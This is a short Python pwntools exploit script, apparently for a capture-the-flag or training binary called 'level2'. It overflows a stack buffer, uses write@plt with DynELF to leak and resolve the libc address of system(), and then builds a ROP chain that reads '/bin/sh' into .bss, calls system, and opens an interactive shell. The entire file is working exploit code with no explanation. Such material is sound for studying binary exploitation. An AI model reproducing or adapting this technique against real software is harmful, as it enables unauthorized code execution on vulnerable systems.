#!/usr/bin/env python

from pwn import *

elf = ELF('../bin/level2')
plt_write = elf.symbols['write']
plt_read = elf.symbols['read']
vulfun_addr = 0x804844d

def leak(address):
  payload1 = 'A'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(address) + p32(4)
  p.send(payload1)
  data = p.recv(4)
  print "%#x => %s" %(address, (data or '').encode('hex'))
  return data

p = process('../bin/level2')

d = DynELF(leak, elf=ELF('../bin/level2'))

system_addr = d.lookup('system', 'libc')
print "system_addr= " + hex(system_addr)

bss_addr = 0x804a024
pppr = 0x804850d

payload2 = 'A'*140 + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr) 

print "\n###sending payload2 ...###"
p.send(payload2)
p.send("/bin/sh\0")

p.interactive()
